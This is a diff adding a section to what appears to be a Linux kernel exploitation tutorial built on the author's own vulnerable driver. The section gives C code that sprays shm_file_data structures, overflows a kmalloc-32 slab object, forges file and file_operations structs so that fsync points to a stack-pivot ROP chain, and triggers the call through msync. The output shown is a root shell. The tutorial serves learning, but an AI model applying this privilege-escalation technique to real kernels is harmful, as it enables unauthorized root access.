@@ -28,7 +28,8 @@
 	 * [Bypass SMEP with stack pivoting](#bypass-smep-with-stack-pivoting)
 * [Heap overflow](#heap-overflow)
 	 * [Heap overflow primitive](#heap-overflow-primitive)  
-	 * [SLUB overflow](#slub-overflow)
+	 * [SLUB overflow](#slub-overflow)  
+	 * [Moving on to shmat](#moving-on-to-shmat)
 
 ## Creating the enviornment and the first kernel module
 
@@ -1072,7 +1073,128 @@ But what do we do with the return address? Basically the stack pivot exploit. I 
 ```  
 Well, that is bad. What happens, is that we wait for the timer to trigger, but it works with an interrupt. With interrupts there is a problem, that it only has page tables for the kernel space memory, not for the user space. So we will never be able to rop from our mmaped memory. We need another solution.  
 
+### Moving on to shmat  
 
+Another cool structure we can use for exploiting is `shm_file_data`. This is a small structure that gets allocated on the kmalloc-32 bin. To allocate this, we can use the `shmat` syscall, which attaches shared memory segment to the process address space. During the process it creates these structures, which we can spray this way. This is how we allocate them in our exploit:  
+```C
+void *create_shm_file_data(int id){
+	void * ret;
+	ret = shmat(id, NULL, 0);
+	if((long)ret == -1){
+		printf("[-] Failed to allocate shm_file_struct\n");
+		perror("shmat");
+		exit(-1);
+	}
+	return ret;
+}
+```  
+One important part of this code is the id. This needs to be a valid id, that identifies a memory segment. To get this id, we need to call the `shmget` syscall. I made a function for this too:  
+```C
+int get_shm_id(){
+	int ret;
+
+	ret = shmget(IPC_PRIVATE, 0x1000, SHM_R|SHM_W);
+	if(ret == -1){
+		printf("[-] Failed to get shmid\n");
+		perror("shmget");
+		exit(-1);
+	}
+	return ret;
+}
+```  
+Ok, cool, we now have a now structure that we can allocate. But how does the structure look like? This is the definition from the linux source code:  
+```C
+struct shm_file_data {
+	int id;
+	struct ipc_namespace *ns;
+	struct file *file;
+	const struct vm_operations_struct *vm_ops;
+};
+```  
+So, we have an id, that we got from `shmget`, and 3 pointers. The `file` is the one that is important to us. Check out its structure:  
+```C
+struct file {
+	union {
+		struct llist_node	fu_llist;
+		struct rcu_head 	fu_rcuhead;
+	} f_u;
+	struct path		f_path;
+	struct inode		*f_inode;	/* cached value */
+	const struct file_operations	*f_op;
+	spinlock_t		f_lock;
+	...
+};
+```  
+As we can see, it has a `file_operations` field, which contains a bunch of function pointers for the different file operations. We can use this for exploitation. The one we are going to use is `fsync` which just flushes the content from the shared memory to the file. But how do we overwrite this with an overflow? We need to make structures, that are the same as in kernel code, but only the necessary fields have valid data. So we don't need to define every field of the file struct, we can use placeholders with the correct sizes (use gdb for this).  
+```C
+struct file{
+	unsigned char begin[40];
+	struct file_operations *f_op;
+	unsigned char between[152];
+	void *private_data;
+	unsigned char rest[24];
+};
+```  
+As you can see, we have 2 fields with valid values and the rest is just nothing. The file operations pointer is the most important, but to make this work, we need `private_data` to have a valid value, in this case it is the pointer to the `shm_file_data` struct, which we want to overflow. As for the `f_op`, I created another struct for it:  
+```C
+struct file_operations {
+	void *owner;
+	void *llseek;
+	void *read;
+	void *write;
+	...
+	void *flush;
+	void *release;
+	void *fsync;
+	void *fasync;
+	void *lock;
+	...
+};
+```
+Here I just copied the real struct from the kernel source and set everything to a void pointer. Now we are ready to start writing the real exploit part. After opening the device file I just allocated 10 `shm_file_data` structs on the heap to make sure they are following each other:  
+```C
+printf("[+] Allocating many shm_file_data structs...\n");
+for(int i=0; i<10; i++){
+	shmid = get_shm_id();
+	create_shm_file_data(shmid);
+}
+```
+Now we want to get one of these structs to be after our own allocated memory that we can overwrite. To do this, I allocated one with our device driver and the immediately allocated a `shm_file_data` struct.  
+```C
+shmid = get_shm_id();
+printf("[+] Allocating address...\n");
+driver_alloc(iom);
+address = create_shm_file_data(shmid);
+```  
+After that we need to make sure that the two structs follow eachother. For this we can read 64 bytes from our allocated memory, and compare the two id's (before this I filled our memory with 'A' for debug purposes).  
+```C
+driver_read_write(target, iom->addr, 8 * sizeof(unsigned long));
+if((int)target[4] != shmid){
+	printf("[-] Spraying unsuccessfull\n");
+	exit(-1);
+}
+printf("[+] Spraying successfull\n");
+```  
+After we ensured that we are successfull, we can send our payload. For this, I created the two structs mentioned before and filled their required fields:  
+```C
+struct file_operations f_ops;
+struct file s_file;
+...
+f_ops.fsync = (void*)stacklift;
+s_file.f_op = &f_ops;
+...
+s_file.private_data = (void*)(((unsigned long)iom->addr) + 32);
+target[6] = (unsigned long)&s_file;
+```  
+So, what happens here is that I set the fsync pointer of f_ops to the stacklift address, so if the kernel calls fsync on this file, our ROP chain starts working. Then I set the f_op pointer of file to this f_ops variable. Then after I read the `shm_file_data` in the previous step, I set its address to be the private_data field in the file. And then, because I could use the array we read to to send back the same data to the heap, I just set the file pointer of the struct to the address of s_file, and sent it back. Now we performed the slub overflow. But how can we trigget? That's where we use the `msync` syscall. All it does (after a while) is calling fsync on our file, which we want. So let's call this:  
+```C
+printf("[+] Triggering exploit...\n");
+ret = msync(address, 0x1000, MS_SYNC);
+if(ret != 0){
+	perror("msync");
+}
+```  
+Now we are done with the exploit let's try it out.  
 ```
 # id
 uid=1000(user) gid=1000 groups=1000
@@ -1086,7 +1208,7 @@ uid=1000(user) gid=1000 groups=1000
 [ 1111.154803] R/W kernel heap
 [-] Spraying unsuccessfull
 ```  
-
+This is what happens sometimes. Because the kmalloc-32 bin is used many times, we will have some fails trying this exploit. But if we try again... 
 ```
 # id
 uid=1000(user) gid=1000 groups=1000
@@ -1106,4 +1228,5 @@ uid=1000(user) gid=1000 groups=1000
 [+] Privilege level successfully escalated, spawning shell...
 /home/user # id
 uid=0(root) gid=0(root)
-```
+```  
+... it should work.
